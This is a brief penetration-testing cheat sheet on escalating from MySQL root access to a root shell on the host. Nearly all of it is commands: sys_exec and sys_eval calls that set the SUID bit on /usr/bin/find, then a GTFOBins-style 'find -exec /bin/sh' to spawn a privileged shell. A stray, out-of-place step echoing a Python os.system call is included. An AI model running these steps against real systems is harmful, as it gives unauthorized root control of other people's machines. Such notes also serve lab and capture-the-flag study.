# Abuse MySQL as root

### If we have root access in the MySQL hosted on the target machine, we may have the possibility to execute privileged commands as if we were root on the machine as well.

#### 1) 

    mysql -u root -p

#### 2) 

    SELECT sys_exec('chmod u+s /usr/bin/find');
    SELECT sys_eval('chmod u+s /usr/bin/find');

#### 3) 

    echo os.system('/bin/bash')

#### 4) 

    find FILE -exec "/bin/sh" \; (GTFOBINS)
